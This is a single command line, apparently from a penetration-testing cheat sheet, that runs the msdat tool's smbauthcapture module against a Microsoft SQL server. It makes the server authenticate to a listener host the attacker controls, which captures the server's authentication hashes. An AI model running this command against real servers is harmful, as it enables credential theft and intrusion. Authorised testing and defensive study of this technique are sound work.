msdat smbauthcapture -v -s <RHOST> -p <RPORT> -D <DB_NAME> -U <USERNAME> -P '<PASSWORD>' --capture <LHOST_SMB_SERVER>
```
